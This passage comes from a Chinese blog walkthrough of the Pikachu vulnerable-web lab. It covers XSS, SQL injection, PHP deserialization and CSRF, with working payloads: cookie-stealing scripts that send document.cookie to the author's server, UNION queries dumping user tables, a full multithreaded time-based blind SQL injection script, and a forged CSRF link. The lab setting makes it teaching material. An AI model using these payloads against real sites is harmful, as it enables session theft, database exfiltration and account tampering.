<p>所以现在只需要让受害者访问<code>http://ipadd/myxss/xss_post.php</code>这个页面, 我就能直接获得他在这个页面的cookie, 简直不要太爽!(前提是该用户必须已经登录过)</p>
<figure class="image-box">
                <img src="http://188.131.227.20:999/picture/post_cookie.png" alt title class>
                <p></p>
            </figure>

<h3 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h3><p>感觉存储型比上面的反射型还要简单很多, 留言框输入:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://ipadd/myjs/get_cookie.js</span> /&gt;</span></span><br></pre></td></tr></table></figure>

<p>完事~</p>
<h3 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h3><p><a href="https://www.w3school.com.cn/htmldom/dom_intro.asp" target="_blank" rel="noopener">什么是 DOM?</a></p>
<p>再放一张w3school的图</p>
<figure class="image-box">
                <img src="http://188.131.227.20:999/picture/ct_htmltree.gif" alt title class>
                <p></p>
            </figure>

<p>总之, DOM应该就是包括<code>html</code>在内的结构化文档的一个树状模型. 不过<code>html</code>文档符合树状结构我倒是在大概一个月前用<code>python selenium</code>写那个QQ空间自动点赞的程序时就早有体会了. <code>DOM</code>与<code>xpath</code>给我的印象还是很相似的, 不知两者严格来讲到底是什么关系.</p>
<p>再看题目这边, 随便输入一个<code>123</code>, 我们看到生成了一个超链接, 指向<code>http://ipadd/pikachu/vul/xss/123</code>, 也就是我们输入的内容会成为链接末尾的部分.</p>
<p>包含超链接的<code>div元素</code>的代码如下.</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"dom"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"</span></span></span><br><span class="line"><span class="tag"><span class="string"></span></span></span><br><span class="line"><span class="tag"><span class="string">        123</span></span></span><br><span class="line"><span class="tag"><span class="string"></span></span></span><br><span class="line"><span class="tag"><span class="string">        "</span>&gt;</span>what do you see?<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里生成div元素是通过js方法<code>domxss()</code>实现的.</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">domxss</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> str = <span class="built_in">document</span>.getElementById(<span class="string">"text"</span>).value;</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">"dom"</span>).innerHTML = <span class="string">"&lt;a href='"</span>+str+<span class="string">"'&gt;what do you see?&lt;/a&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//试试：'&gt;&lt;img src="#" onmouseover="alert('xss')"&gt;</span></span><br><span class="line"><span class="comment">//试试：' onclick="alert('xss')"&gt;,闭合掉就行</span></span><br></pre></td></tr></table></figure>

<p>这里作者已经给了我们提示了, 我们需要闭合原语句来构造我们的payload.</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">'&gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"#"</span> <span class="attr">onmouseover</span>=<span class="string">"</span></span></span><br><span class="line"><span class="tag"><span class="string">var img = new Image();</span></span></span><br><span class="line"><span class="tag"><span class="string">img.src = 'http://ipadd/myxss/index.php?cookie=' + document.cookie;</span></span></span><br><span class="line"><span class="tag"><span class="string">document.body.append(img);"</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>将这段代码提交后, 我们看生成的<div></div></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"#"</span> <span class="attr">onmouseover</span>=<span class="string">" var img = new Image(); img.src = 'http://ipadd/myxss/index.php?cookie=' + document.cookie; document.body.append(img);"</span>&gt;</span></span><br><span class="line">        "'what do you see?"</span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>当鼠标经过图片时, 我的服务器上就已经获取了用户的cookie.</p>
<h3 id="DOM型xss-x"><a href="#DOM型xss-x" class="headerlink" title="DOM型xss-x"></a>DOM型xss-x</h3><p>当提交后, 会产生第一个链接, 点击后会调用下面的方法(已经加入注释)生成第二个链接.</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">domxss</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> str = <span class="built_in">window</span>.location.search;  <span class="comment">//获取url中的GET参数</span></span><br><span class="line"><span class="keyword">var</span> txss = <span class="built_in">decodeURIComponent</span>(str.split(<span class="string">"text="</span>)[<span class="number">1</span>]); <span class="comment">//将str中的"text="删去</span></span><br><span class="line"><span class="keyword">var</span> xss = txss.replace(<span class="regexp">/\+/g</span>,<span class="string">' '</span>);   <span class="comment">//将txss中的 '+' 替换为 ' '</span></span><br><span class="line"><span class="comment">//alert(xss);</span></span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">"dom"</span>).innerHTML = <span class="string">"&lt;a href='"</span>+xss+<span class="string">"'&gt;就让往事都随风,都随风吧&lt;/a&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//试试：'&gt;&lt;img src="#" onmouseover="alert('xss')"&gt;</span></span><br><span class="line"><span class="comment">//试试：' onclick="alert('xss')"&gt;,闭合掉就行</span></span><br><span class="line"><span class="string">``</span><span class="string">`         </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">总之就是把我们输入的文本(此处成了参数)提取出来了.</span></span><br><span class="line"><span class="string">后面的都差不多</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">### xss之盲打</span></span><br><span class="line"><span class="string">提交的留言会直接显示在后台中.</span></span><br><span class="line"><span class="string">虽然我们(用户)看不到, 但是管理员可以看到, 这是针对后台管理员的攻击.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">### xss之过滤</span></span><br><span class="line"><span class="string">题目使用了正则表达式过滤,</span></span><br><span class="line"><span class="string">`</span><span class="string">``</span>php</span><br><span class="line">$message=preg_replace(<span class="string">'/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/'</span>, <span class="string">''</span>, $_GET[<span class="string">'message'</span>]);</span><br></pre></td></tr></table></figure>

<p>使用下面的绕过.<br><img src="0" onclick="alert(1)"></p>
<h2 id="sqli"><a href="#sqli" class="headerlink" title="sqli"></a>sqli</h2><h3 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h3><p>因为输入框的数字被限定在了1-6, 所以需要抓包改数据. 最好使用<code>burp suite</code>的 <code>Repeater</code>功能来多次发送payload.<br>可以令<code>id=1 or 1</code>, 这样所有的where 子句布尔值都为真, 可以遍历出, 所有的数据.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">hello,vince  </span><br><span class="line">your email is: vince@pikachu.com  </span><br><span class="line">hello,allen   </span><br><span class="line">your email is: allen@pikachu.com  </span><br><span class="line">hello,kobe   </span><br><span class="line">your email is: kobe@pikachu.com  </span><br><span class="line">hello,grady   </span><br><span class="line">your email is: grady@pikachu.com  </span><br><span class="line">hello,kevin  </span><br><span class="line">your email is: kevin@pikachu.com  </span><br><span class="line">hello,lucy  </span><br><span class="line">your email is: lucy@pikachu.com  </span><br><span class="line">hello,lili  </span><br><span class="line">your email is: lili@pikachu.com</span><br></pre></td></tr></table></figure>

<p>如果题目的mysql查询语句后加上<code>LIMIT 0,1</code>或你想爆出数据库更多的数据就不会这么简单了, 可以用我之间的<a href="http://tjuyjn.top/2019/07/11/sqli-lab%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/">sqli-lab</a>里总结的方法, 如下:</p>
<ol>
<li>令<code>id=2-1</code>, 发现和<code>id=1</code>时相同, 确定这是数字型.</li>
<li>令<code>id=0</code>, 查询结果集为空.</li>
<li>令<code>id=0 union select 1,2</code>, 查询结果为<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hello, 1  </span><br><span class="line">your email is:2</span><br></pre></td></tr></table></figure>

</li>
</ol>
<p>这表明结果集为两列.</p>
<ul>
<li>令<code>id=0 union select database(),(select group_concat(schema_name) from information_schema.schemata)--+</code><br>结果为(无关数据已打码)<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hello,pikachu </span><br><span class="line">your email is: information_schema,xxxxx,mysql,performance_schema,xxxx,pikachu,xxxxxxxxx...</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>这样就获得了题目使用的数据库和所有数据库</p>
<ol start="4">
<li>令<code>id=0 union select 2,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;pikachu&#39;)--+</code>, 结果为:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hello,2</span><br><span class="line">your email is: httpinfo,member,message,users,xssblind</span><br></pre></td></tr></table></figure>

</li>
</ol>
<p>这样得到了该数据库的表名.</p>
<ol start="5">
<li>令<code>id=0 union select 2,(select group_concat(column_name) from information_schema.columns where table_name=&#39;member&#39;)--+</code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">your email is: id,username,pw,sex,phonenum,address,email</span><br></pre></td></tr></table></figure>

</li>
</ol>
<p>得到<code>users</code>的所有列名.</p>
<ol start="6">
<li>令<code>id=0 union select (select group_concat(username) from pikachu.member),(select group_concat(email) from pikachu.member)--+</code>爆出<code>username</code>和<code>email</code>这两个字段.<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hello,vince,allen,kobe,grady,kevin,lucy,lili</span><br><span class="line">your email is: vince@pikachu.com,allen@pikachu.com,kobe@pikachu.com,grady@pikachu.com,kevin@pikachu.com,lucy@pikachu.com,lili@pikachu.com</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h3 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h3><p>和上题类似, 只是字符型需要考虑闭合.<br>这里是用<code>&#39;</code>闭合.</p>
<h3 id="搜索型注入-略"><a href="#搜索型注入-略" class="headerlink" title="搜索型注入(略)"></a>搜索型注入(略)</h3><h3 id="xx型注入-略"><a href="#xx型注入-略" class="headerlink" title="xx型注入(略)"></a>xx型注入(略)</h3><h3 id="布尔盲注-略"><a href="#布尔盲注-略" class="headerlink" title="布尔盲注(略)"></a>布尔盲注(略)</h3><p>这三个和之前的区别不大, 不赘述了.</p>
<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>这道题的特点是, 查询结果无论正确与否都不会显示出来.</p>
<p>所以可以使用时间盲注.</p>
<p>例如, 想要判断<code>database()</code>的文本长度, 就可以使用 payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ipadd/pikachu/vul/sqli/sqli_blind_t.php?name=1&apos; or length(database()) = 7 and sleep(3) -- &amp;submit=%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure>

<p>会发现页面延迟了很久才加载出来.</p>
<p>这是因为我们的查询语句中有<code>sleep(3)</code>, 说明<code>length(database())=7</code>成立(否则会因为短路效应不执行<code>sleep()</code>).</p>
<p>基于这个原理, 我写了个时间盲注的python脚本</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="comment"># 全局变量, 避免使用引用传参</span></span><br><span class="line">result = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># 二分搜索</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bin_search</span><span class="params">(base, top, number, flag)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> flag : <span class="comment"># 说明payload为真    </span></span><br><span class="line">        base = number+<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span> : <span class="comment"># 说明 payload为假   </span></span><br><span class="line">        top = number</span><br><span class="line">    number = int((top+base)/<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> [base,top,number]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数字爆破</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">boom_num_GET</span><span class="params">(targetUrl,info,parm)</span>:</span> </span><br><span class="line">    [base,top,number] = [<span class="number">1</span>,<span class="number">100</span>,<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        payload = <span class="string">'1\' or length(('</span>+ info +<span class="string">')) &gt; '</span>+str(number)+<span class="string">' and sleep(0.3) -- '</span></span><br><span class="line">        time1 = time.time()</span><br><span class="line">        requests.get(url= targetUrl + payload + parm)</span><br><span class="line">        time2 = time.time()</span><br><span class="line">        [base,top,number] = bin_search(base,top,number,time2-time1 &gt; <span class="number">1.2</span>)</span><br><span class="line">        <span class="keyword">if</span> base == top:</span><br><span class="line">            <span class="keyword">return</span> base</span><br><span class="line"></span><br><span class="line"><span class="comment"># 字符爆破</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">boom_chr</span><span class="params">(info,n,targetUrl,parm)</span>:</span> </span><br><span class="line">    <span class="keyword">global</span> result</span><br><span class="line">    <span class="comment"># 设置ascii码的上下限</span></span><br><span class="line">    [base,top,number] = [<span class="number">32</span>,<span class="number">126</span>,<span class="number">79</span>] </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        payload = <span class="string">'1\' or ascii(substr(('</span>+ info +<span class="string">'),'</span>+str(n)+<span class="string">',1)) &gt; '</span>+str(number)+<span class="string">' and sleep(0.3) -- '</span> </span><br><span class="line">        time1 = time.time()</span><br><span class="line">        requests.get(url=targetUrl + payload + parm)</span><br><span class="line">        time2 = time.time()</span><br><span class="line">        [base,top,number] = bin_search(base,top,number,time2-time1 &gt; <span class="number">1.2</span>)</span><br><span class="line">        <span class="keyword">if</span> base == top:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    result[n<span class="number">-1</span>] = chr(base)</span><br><span class="line">    print(result)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 文本爆破                          </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">boom_text_GET</span><span class="params">(targetUrl,info,parm,len_of_txt)</span>:</span> </span><br><span class="line">    <span class="keyword">global</span> result</span><br><span class="line">    result = [<span class="number">0</span>]*len_of_txt</span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">1</span>,len_of_txt+<span class="number">1</span>):</span><br><span class="line">        <span class="comment"># 多线程</span></span><br><span class="line">        t = threading.Thread(target=boom_chr,args=(info,n,targetUrl,parm))</span><br><span class="line">        t.start()</span><br><span class="line">        <span class="comment"># 这里限制最大线程数</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">if</span>(len(threading.enumerate()) &lt; <span class="number">9</span>):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="comment"># 确保所有线程跑完再退出去</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span>(len(threading.enumerate()) == <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        </span><br><span class="line"><span class="comment"># 主函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> result</span><br><span class="line">    url = <span class="string">'http://ipadd/pikachu/vul/sqli/sqli_blind_t.php?name='</span> <span class="comment">#url的前半段</span></span><br><span class="line">    parm = <span class="string">'&amp;submit=查询'</span> <span class="comment"># url的后半段</span></span><br><span class="line">    info = <span class="string">'load_file(\'/var/lib/mysql-files/flag\')'</span> <span class="comment"># 你要查询的东东</span></span><br><span class="line">    </span><br><span class="line">    print(<span class="string">'start...'</span>)</span><br><span class="line">    time0 = time.time()</span><br><span class="line">    len_of_database = boom_num_GET(url,info,parm)</span><br><span class="line">    print(<span class="string">"length of text is : "</span>, len_of_database)</span><br><span class="line"></span><br><span class="line">    boom_text_GET(url,info, parm, len_of_database)</span><br><span class="line">    result = <span class="string">''</span>.join(result)</span><br><span class="line">    print(<span class="string">"result is : "</span>,result)</span><br><span class="line">    print(<span class="string">"complete, cost time is "</span>, time.time() - time0)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="comment"># get 请求下的mysql时间盲注脚本</span></span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>目前来看, 除了有点慢还是比较不错的, 有机会升级成多线程, 应该还能大幅缩短时间. </p>
<p>以后再说吧.</p>
<h4 id="2019-9-15-更新-源码已修改"><a href="#2019-9-15-更新-源码已修改" class="headerlink" title="2019/9/15 更新(源码已修改)"></a>2019/9/15 更新(源码已修改)</h4><ul>
<li>加入了我期待已久的多线程, 运行时间缩短为原先的八分之一左右</li>
</ul>
<h2 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="PHP反序列化漏洞"></a>PHP反序列化漏洞</h2><h3 id="知识铺垫"><a href="#知识铺垫" class="headerlink" title="知识铺垫"></a>知识铺垫</h3><ul>
<li>序列化 serialize()</li>
<li>反序列化 unserialize()</li>
<li>魔术方法: PHP 将所有以 __（两个下划线）开头的类方法保留为魔术方法. 关于魔术方法的定义我没有在网上明确的找到, 但是根据我的查阅, 类似C++中的构造函数, 拷贝赋值函数那样可以在某些特定时间自动执行的函数就是魔术方法.</li>
<li>常用的几个魔术方法:<table>
<thead>
<tr>
<th align="left">函数名</th>
<th align="left">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="left">__construct()</td>
<td align="left">当一个对象创建时被调用</td>
</tr>
<tr>
<td align="left">__destruct()</td>
<td align="left">当一个对象销毁时被调用</td>
</tr>
<tr>
<td align="left">__toString()</td>
<td align="left">当一个对象被当作一个字符串使用</td>
</tr>
<tr>
<td align="left">__sleep()</td>
<td align="left">在对象在被序列化之前运行</td>
</tr>
<tr>
<td align="left">__wakeup</td>
<td align="left">将在序列化之后立即被调用</td>
</tr>
</tbody></table>
</li>
</ul>
<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p>当你输入任何非序列化字符串时, 都回返回一句<code>大兄弟,来点劲爆点儿的!</code>.</p>
<p>一开始有点不明所以, 不过既然是第一次学习, 我们还是先看看题目的源码吧!</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 有改动, 去除无关紧要部分的代码</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $test = <span class="string">"pikachu"</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//O:1:"S":1:&#123;s:4:"test";s:29:"&lt;script&gt;alert('xss')&lt;/script&gt;";&#125;</span></span><br><span class="line"><span class="comment">// 上面这行是作者留下的, 其实就是题目的payload了</span></span><br><span class="line">$html=<span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'o'</span>]))&#123;</span><br><span class="line">    $s = $_POST[<span class="string">'o'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!@$unser = unserialize($s))&#123;</span><br><span class="line">        $html.=<span class="string">"&lt;p&gt;大兄弟,来点劲爆点儿的!&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $html.=<span class="string">"&lt;p&gt;&#123;$unser-&gt;test&#125;&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">... <span class="comment">//略去无关代码</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $html;<span class="meta">?&gt;</span></span><br><span class="line">... <span class="comment">//略去无关代码</span></span><br></pre></td></tr></table></figure>

<p>我们来追溯下输入普通字符串时和payload的时候程序内部的状态:</p>
<ul>
<li><p><code>geidalaodicha</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$_POST[<span class="string">'o'</span>] = <span class="string">"geidalaodicha"</span></span><br><span class="line">$s = <span class="string">"geidalaodicha"</span></span><br><span class="line">unserialize($s)无法正常执行!</span><br><span class="line">(!@$unser = unserialize($s))为真 </span><br><span class="line">进入第一个分支, $html = <span class="string">"&lt;p&gt;大兄弟,来点劲爆点儿的!&lt;/p&gt;"</span></span><br><span class="line">打印 $html</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>O:1:&quot;S&quot;:1:{s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&quot;;}</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$_POST[<span class="string">'o'</span>] = <span class="string">"O:1:"</span>S<span class="string">":1:&#123;s:4:"</span>test<span class="string">";s:29:"</span>&lt;script&gt;alert(<span class="string">'xss'</span>)&lt;/script&gt;<span class="string">";&#125;"</span></span><br><span class="line">$s = <span class="string">"O:1:"</span>S<span class="string">":1:&#123;s:4:"</span>test<span class="string">";s:29:"</span>&lt;script&gt;alert(<span class="string">'xss'</span>)&lt;/script&gt;<span class="string">";&#125;"</span></span><br><span class="line">unserialize($s)执行并返回$s反序列后的<span class="class"><span class="keyword">class</span> <span class="title">S</span>的实例对象</span></span><br><span class="line">进入第二个分支, $html = "&lt;p&gt;&#123;$unser-&gt;test&#125;&lt;/p&gt;"</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $html;<span class="meta">?&gt;</span>  =&gt;  打印出$unser-&gt;test的值, 也就是`&lt;script ...`</span><br><span class="line">`&lt;script...` 写入html中, 在前端执行.</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>获取有人会疑惑(好吧就是我)为啥打印的不是”</p><p>{$unser-&gt;test}</p>“这段文本, 而是test的值.<p></p>
<p>这是因为</p>
<blockquote>
<p>对于可变变量使用大括号，比如：{$val}，这时候大括号就是告诉PHP，括起来的部分要当成变量处理.</p>
</blockquote>
<p>所以<code>{$unser-&gt;test}</code>直接被当成php语句解析了.</p>
<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><h3 id="CSRF-get"><a href="#CSRF-get" class="headerlink" title="CSRF(get)"></a>CSRF(get)</h3><p>看了下简介, 基本已经有了思路了, 盲猜应该不难.</p>
<p>首先登录lili的账号, 尝试下修改住址为china, 然后提交.</p>
<p>用<code>burp suite</code>截取数据包.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=nan&amp;phonenum=159&amp;add=china&amp;email=123%40qq.com&amp;submit=submit HTTP/1.1</span><br><span class="line">Host: ipadd </span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">Referer: http://ipadd/pikachu/vul/csrf/csrfget/csrf_get_edit.php</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: wp-settings-time-1=1557833844; wp-settings-1=mfold%3Do; PHPSESSID=60hrtmnnsubk5ji1sr2uo8pdd0</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<p>提交之后发现lili的信息被修改了.</p>
<p>如果攻击kobe的账号, 可以制作payload链接.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ipadd/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=girl&amp;phonenum=5418&amp;add=tianjin&amp;email=123%40qq.com&amp;submit=submit</span><br></pre></td></tr></table></figure>

<p>当kobe点击了这个链接后, 他的信息就被修改了. (使用另一个登录kobe账号的浏览器来模拟)</p>
